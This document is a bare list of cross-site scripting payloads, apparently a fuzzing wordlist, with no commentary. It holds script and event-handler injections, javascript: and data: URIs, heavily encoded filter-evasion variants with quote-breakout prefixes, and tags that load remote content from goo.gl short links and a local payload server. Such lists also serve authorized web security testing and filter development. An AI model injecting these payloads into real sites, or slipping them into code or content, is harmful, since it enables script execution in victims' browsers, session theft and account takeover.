"><form action=javascript&NewLine;:alert(1)><input type=submit>
'><form action=javascript&NewLine;:alert(1)><input type=submit>
<form action="javas&Tab;cript:alert(1)" method="get"><input type="submit" value="Submit"></form> 
"><form action="javas&Tab;cript:alert(1)" method="get"><input type="submit" value="Submit"></form> 
'><form action="javas&Tab;cript:alert(1)" method="get"><input type="submit" value="Submit"></form> 
<form action="&Tab;javas&Tab;cript&Tab;:alert('X :)')" autocomplete="on"> First name:<input type="text" name="fname"><br><input type="submit"></form>     
"><form action="&Tab;javas&Tab;cript&Tab;:alert('X :)')" autocomplete="on"> First name:<input type="text" name="fname"><br><input type="submit"></form>     
'><form action="&Tab;javas&Tab;cript&Tab;:alert('X :)')" autocomplete="on"> First name:<input type="text" name="fname"><br><input type="submit"></form>     
<form id="myform" value="" action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="Absenden"></form>
"><form id="myform" value="" action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="Absenden"></form>
'><form id="myform" value="" action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="Absenden"></form>
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)
"></plaintext\></|\><plaintext/onmouseover=prompt(1)
'></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>
"><script>prompt(1)</script>
'><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/X/) type=submit>'-->"></script><script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>"><img/id="confirm&lpar;1&#x29;"/alt="/"src="/"onerror=eval(id&#x29;>'"><img src="http://127.0.0.1:3555/xss_serve_payloads/X.jpg">
<script>var url = "<!--<script>";//</script>alert(1)</script>
"><script>var url = "<!--<script>";//</script>alert(1)</script>
'><script>var url = "<!--<script>";//</script>alert(1)</script>
<form id="myform" value=""+{valueOf:location,length:1,__proto__:[],0:"javascript :alert (1)"}"action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="Absenden"></form>
"><form id="myform" value=""+{valueOf:location,length:1,__proto__:[],0:"javascript :alert (1)"}"action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="Absenden"></form>
'><form id="myform" value=""+{valueOf:location,length:1,__proto__:[],0:"javascript :alert (1)"}"action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="Absenden"></form>
<iframe/src="data:text/html,<svg%09%0A%0B%0C%0D%A0%00%20onload=confirm(1);>">
"><iframe/src="data:text/html,<svg%09%0A%0B%0C%0D%A0%00%20onload=confirm(1);>">
'><iframe/src="data:text/html,<svg%09%0A%0B%0C%0D%A0%00%20onload=confirm(1);>">
<svg/contentScriptType=text/vbs><script>Execute(MsgBox(chr(75)&chr(67)&chr(70)))
"><svg/contentScriptType=text/vbs><script>Execute(MsgBox(chr(75)&chr(67)&chr(70)))
'><svg/contentScriptType=text/vbs><script>Execute(MsgBox(chr(75)&chr(67)&chr(70)))
<img/src='http://127.0.0.1:3555/xss_serve_payloads/X.jpg' onmouseover=&Tab;prompt(1)
"><img/src='http://127.0.0.1:3555/xss_serve_payloads/X.jpg' onmouseover=&Tab;prompt(1)
'><img/src='http://127.0.0.1:3555/xss_serve_payloads/X.jpg' onmouseover=&Tab;prompt(1)
<svg><script>alert&#40 1&#41
"><svg><script>alert&#40 1&#41
'><svg><script>alert&#40 1&#41
<embed/src=//goo.gl/nlX0P>
"><embed/src=//goo.gl/nlX0P>
'><embed/src=//goo.gl/nlX0P>
<object/data=//goo.gl/nlX0P>
"><object/data=//goo.gl/nlX0P>
'><object/data=//goo.gl/nlX0P>
javascript:confirm(1)
javascript:confirm(1);
javascript:alert(1)
javascript:alert(1);
avascript&#00058;alert(1)
javaSCRIPT&colon;alert(1)
JaVaScRipT:alert(1)
javas&Tab;cript:\u0061lert(1);
javascript:\u0061lert&#x28;1&#x29
javascript&#x3A;alert&lpar;1&rpar;
javascript&colon;alert(1)
javascript&#x3A;alert(1)
j&#x61;v&#x41;sc&#x52;ipt&#x3A;alert(1)
j&#x61;v&#x41;sc&#x52;ipt&#x3A;al&#x65;rt&lpar;1&rpar;
vbscript:alert(1);
vbscript&#00058;alert(1);
vbscr&Tab;ipt:alert(1)"
<iframesrc="javascript:alert(2)">
"><iframesrc="javascript:alert(2)">
'><iframesrc="javascript:alert(2)">
<iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">
"><iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">
'><iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">
<isindexformaction="javascript:alert(1)" type=image>
"><isindexformaction="javascript:alert(1)" type=image>
'><isindexformaction="javascript:alert(1)" type=image>
<input type="image" formaction=JaVaScript:alert(0)>
"><input type="image" formaction=JaVaScript:alert(0)>
'><input type="image" formaction=JaVaScript:alert(0)>
<form><button formaction=javascript&colon;alert(1)>CLICKME
"><form><button formaction=javascript&colon;alert(1)>CLICKME
'><form><button formaction=javascript&colon;alert(1)>CLICKME
<form action="Javascript:alert(1)"><input type=submit>
"><form action="Javascript:alert(1)"><input type=submit>
'><form action="Javascript:alert(1)"><input type=submit>
<isindex action="javascript:alert(1)" type=image>
"><isindex action="javascript:alert(1)" type=image>
'><isindex action="javascript:alert(1)" type=image>
<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
"><isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
'><isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
<isindex action=data:text/html, type=image>
"><isindex action=data:text/html, type=image>
'><isindex action=data:text/html, type=image>
“/><marquee onfinish=confirm(1)>a</marquee>
<object data='data:text/xml,<script xmlns="http://www.w3.org/1999/xhtml ">confirm(1)</script>>'>
"><object data='data:text/xml,<script xmlns="http://www.w3.org/1999/xhtml ">confirm(1)</script>>'>
'><object data='data:text/xml,<script xmlns="http://www.w3.org/1999/xhtml ">confirm(1)</script>>'>
<img src= "a" onerror= 'eval(atob("cHJvbXB0KDEpOw=="))'
"><img src= "a" onerror= 'eval(atob("cHJvbXB0KDEpOw=="))'
'><img src= "a" onerror= 'eval(atob("cHJvbXB0KDEpOw=="))'
<script>alert('X')</script>=a
"><script>alert('X')</script>=a
'><script>alert('X')</script>=a
<script>document.write(toStaticHTML("<style>div{font-family:rgb('0,0,0)'''}foo');color=expression(alert(1));{}</style><div>POC</div>"))</script>
"><script>document.write(toStaticHTML("<style>div{font-family:rgb('0,0,0)'''}foo');color=expression(alert(1));{}</style><div>POC</div>"))</script>
'><script>document.write(toStaticHTML("<style>div{font-family:rgb('0,0,0)'''}foo');color=expression(alert(1));{}</style><div>POC</div>"))</script>
';!--"<XSS><script>alert(1);</script>
"><script>alert(1);</script>
'><script>alert(1);</script>={()}
<script>document.body.innerHTML="<a onmouseover%0B=location='\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x61\x6C\x65\x72\x74\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B'><input name=attributes>";</script>
"><script>document.body.innerHTML="<a onmouseover%0B=location='\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x61\x6C\x65\x72\x74\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B'><input name=attributes>";</script>
'><script>document.body.innerHTML="<a onmouseover%0B=location='\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x61\x6C\x65\x72\x74\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B'><input name=attributes>";</script>
asfunction:getURL,javascript:alert(1)//
\%22))}catch(e){}if(!self.a)self.a=!alert(1)//
"]%29;}catch%28e%29{}if%28!self.a%29self.a=!alert%281%29;//
0%5C"))%7Dcatch(e)%7Bif(!window.x)%7Bwindow.x=1;alert(1)%7D%7D//
<button/onclick=alert(1) >X</button>
"><button/onclick=alert(1) >X</button>
'><button/onclick=alert(1) >X</button>
<a onmouseover=(alert(1))>X</a>
"><a onmouseover=(alert(1))>X</a>
'><a onmouseover=(alert(1))>X</a>
<p/onmouseover=javascript:alert(1); >X</p>
"><p/onmouseover=javascript:alert(1); >X</p>
'><p/onmouseover=javascript:alert(1); >X</p>
<article xmlns="><img src=x onerror=alert(1)"></article>
"><article xmlns="><img src=x onerror=alert(1)"></article>
'><article xmlns="><img src=x onerror=alert(1)"></article>
<article xmlns="x:img src=x onerror=alert(1) ">
"><article xmlns="x:img src=x onerror=alert(1) ">
'><article xmlns="x:img src=x onerror=alert(1) ">
<p style="font-family:'\22\3bx:expression(alert(1))/*'">
"><p style="font-family:'\22\3bx:expression(alert(1))/*'">
'><p style="font-family:'\22\3bx:expression(alert(1))/*'">
<svg><style>&ltimg src=x onerror=alert(1)&gt</svg>
"><svg><style>&ltimg src=x onerror=alert(1)&gt</svg>
'><svg><style>&ltimg src=x onerror=alert(1)&gt</svg> 
"><svg><style>&ltimg src=x onerror=alert(1)&gt</svg>
"><svg><style>&ltimg src=x onerror=alert(1)&gt</svg>
'><svg><style>&ltimg src=x onerror=alert(1)&gt</svg> 
'><svg><style>&ltimg src=x onerror=alert(1)&gt</svg>
"><svg><style>&ltimg src=x onerror=alert(1)&gt</svg>
'><svg><style>&ltimg src=x onerror=alert(1)&gt</svg> 
<listing>&ltimg src=x onerror=alert(1)&gt</listing>
"><listing>&ltimg src=x onerror=alert(1)&gt</listing>
'><listing>&ltimg src=x onerror=alert(1)&gt</listing>
"onmouseover=alert(1);a="
'+alert(1)&&null=='
+alert(1)&&null=='
\\\'><script>1<\\/script>
\\\'><body onload=\\\'1\\\'>
\"><script>1<\\/script>
><script>1<\\/script>
\"><body onload=\"1\">
<img src=\"x:X\" onerror=\"alert(1)\">
"><img src=\"x:X\" onerror=\"alert(1)\">
'><img src=\"x:X\" onerror=\"alert(1)\">
<img src=a onerror=alert(1)
"><img src=a onerror=alert(1)
'><img src=a onerror=alert(1)
<script>alert(\'1\')</script>
"><script>alert(\'1\')</script>
'><script>alert(\'1\')</script>
<script>alert(\'\\\\1\\\\\')</script>
"><script>alert(\'\\\\1\\\\\')</script>
'><script>alert(\'\\\\1\\\\\')</script>
<script>alert(\'\\/\\1\\/\\\')</script>
"><script>alert(\'\\/\\1\\/\\\')</script>
'><script>alert(\'\\/\\1\\/\\\')</script>
\'\'\">
<scri%00pt>alert(1);</scri%00pt>
"><scri%00pt>alert(1);</scri%00pt>
'><scri%00pt>alert(1);</scri%00pt>
<scri\x00pt>alert(1);</scri%00pt>
"><scri\x00pt>alert(1);</scri%00pt>
'><scri\x00pt>alert(1);</scri%00pt>
<s%00c%00r%00%00ip%00t>confirm(1);</s%00c%00r%00%00ip%00t>
"><s%00c%00r%00%00ip%00t>confirm(1);</s%00c%00r%00%00ip%00t>
'><s%00c%00r%00%00ip%00t>confirm(1);</s%00c%00r%00%00ip%00t>
<script>alert(1);</script>
"><script>alert(1);</script>
'><script>alert(1);</script>
<%0ascript>alert(1);</script>
"><%0ascript>alert(1);</script>
'><%0ascript>alert(1);</script>
<%0bscript>alert(1);</script>
"><%0bscript>alert(1);</script>
'><%0bscript>alert(1);</script>
<!--[if]><script>alert(1)</script -->
"><!--[if]><script>alert(1)</script -->
'><!--[if]><script>alert(1)</script -->
<SCRIPT> alert(\"1\");</SCRIPT>
"><SCRIPT> alert(\"1\");</SCRIPT>
'><SCRIPT> alert(\"1\");</SCRIPT>
<SCRIPT> alert(\"1\")</SCRIPT>
"><SCRIPT> alert(\"1\")</SCRIPT>
'><SCRIPT> alert(\"1\")</SCRIPT>
<script>alert([!![]] [])</script>
"><script>alert([!![]] [])</script>
'><script>alert([!![]] [])</script>
<var onmouseover="prompt(1)">X</var>
"><var onmouseover="prompt(1)">X</var>
'><var onmouseover="prompt(1)">X</var>
%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80​
<input type="text" value=``<div/onmouseover='alert(1)'>X</div>
"><input type="text" value=``<div/onmouseover='alert(1)'>X</div>
'><input type="text" value=``<div/onmouseover='alert(1)'>X</div>
<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ​
"><iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ​
'><iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ​
<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
"><iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
'><iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
"><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
'><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>​
"><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
"><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
'><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>​
'><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
"><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
'><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>​
<embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>
"><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>
'><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>​
"><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>​
'><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>​
<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
"><script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
'><script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/X/)></script
"><script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/X/)></script
'><script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/X/)></script ​​​​​​​​​​​​
"><script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/X/)></script
"><script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/X/)></script
'><script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/X/)></script ​​​​​​​​​​​​
'><script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/X/)></script
"><script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/X/)></script
'><script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/X/)></script ​​​​​​​​​​​​
<script itworksinallbrowsers>/*<script* */alert(1)</script
"><script itworksinallbrowsers>/*<script* */alert(1)</script
'><script itworksinallbrowsers>/*<script* */alert(1)</script ​
"><script itworksinallbrowsers>/*<script* */alert(1)</script ​
'><script itworksinallbrowsers>/*<script* */alert(1)</script ​
<img src ?itworksonchrome?\/onerror = alert(1)
"><img src ?itworksonchrome?\/onerror = alert(1)
'><img src ?itworksonchrome?\/onerror = alert(1)​​​
"><img src ?itworksonchrome?\/onerror = alert(1)​​​
'><img src ?itworksonchrome?\/onerror = alert(1)​​​
<meta http-equiv="refresh" content="0; url=data:text/html;blabla,&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
"><meta http-equiv="refresh" content="0; url=data:text/html;blabla,&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
'><meta http-equiv="refresh" content="0; url=data:text/html;blabla,&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
"><a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
'><a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
"><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
'><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ​
"><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
"><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
'><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ​
'><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
"><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
'><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ​
<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>​
"><div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>​
'><div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>​
<img src=x onerror=window.open('http://127.0.0.1:3555/xss_serve_payloads/X.html"');>
"><img src=x onerror=window.open('http://127.0.0.1:3555/xss_serve_payloads/X.html"');>
'><img src=x onerror=window.open('http://127.0.0.1:3555/xss_serve_payloads/X.html"');>
<table background=javascript:alert(1)></table>
"><table background=javascript:alert(1)></table>
'><table background=javascript:alert(1)></table>
<object/data=//127.0.0.1:3555/xss_serve_payloads/flash.swf
"><object/data=//127.0.0.1:3555/xss_serve_payloads/flash.swf
'><object/data=//127.0.0.1:3555/xss_serve_payloads/flash.swf
<applet code="javascript:confirm(1);">
"><applet code="javascript:confirm(1);">
'><applet code="javascript:confirm(1);">
<marquee/onstart=confirm(2)>/
"><marquee/onstart=confirm(2)>/
'><marquee/onstart=confirm(2)>/
<body onload=prompt(1);>
"><body onload=prompt(1);>
'><body onload=prompt(1);>
<select autofocus onfocus=alert(1)>
"><select autofocus onfocus=alert(1)>
'><select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
"><textarea autofocus onfocus=alert(1)>
'><textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
"><keygen autofocus onfocus=alert(1)>
'><keygen autofocus onfocus=alert(1)>
<video><source onerror="javascript:alert(1)">
"><video><source onerror="javascript:alert(1)">
'><video><source onerror="javascript:alert(1)">
<a onmouseover="javascript:window.onerror=alert;throw 1>
"><a onmouseover="javascript:window.onerror=alert;throw 1>
'><a onmouseover="javascript:window.onerror=alert;throw 1>
<img src=x onerror="javascript:window.onerror=alert;throw 1">
"><img src=x onerror="javascript:window.onerror=alert;throw 1">
'><img src=x onerror="javascript:window.onerror=alert;throw 1">
<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';
"><body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';
'><body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';
<img style="xss:expression(alert(1))">
"><img style="xss:expression(alert(1))">
'><img style="xss:expression(alert(1))">
<div style="color:rgb(''&#0;x:expression(alert(1))"></div>
"><div style="color:rgb(''&#0;x:expression(alert(1))"></div>
'><div style="color:rgb(''&#0;x:expression(alert(1))"></div>
<a onmouseover=location=’javascript:alert(1)>click
"><a onmouseover=location=’javascript:alert(1)>click
'><a onmouseover=location=’javascript:alert(1)>click
<body onfocus="location='javascrpt:alert(1) >123
"><body onfocus="location='javascrpt:alert(1) >123
'><body onfocus="location='javascrpt:alert(1) >123
<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a><circle r=100 /><animate attributeName="xlink:href" values=";javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/>
"><svg xmlns:xlink="http://www.w3.org/1999/xlink"><a><circle r=100 /><animate attributeName="xlink:href" values=";javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/>
'><svg xmlns:xlink="http://www.w3.org/1999/xlink"><a><circle r=100 /><animate attributeName="xlink:href" values=";javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/>
<svg><![CDATA[><imagexlink:href="]]><img/src=xx:xonerror=alert(1)//"></svg>
"><svg><![CDATA[><imagexlink:href="]]><img/src=xx:xonerror=alert(1)//"></svg>
'><svg><![CDATA[><imagexlink:href="]]><img/src=xx:xonerror=alert(1)//"></svg>
<meta content="&NewLine; 1 &NewLine;;JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/> 
"><meta content="&NewLine; 1 &NewLine;;JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/> 
'><meta content="&NewLine; 1 &NewLine;;JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/> 
<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:\u0061lert(1);"></g></svg> 
"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:\u0061lert(1);"></g></svg> 
'><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:\u0061lert(1);"></g></svg> 
<style>#test{x:expression(alert(/X/))}</style>
"><style>#test{x:expression(alert(/X/))}</style>
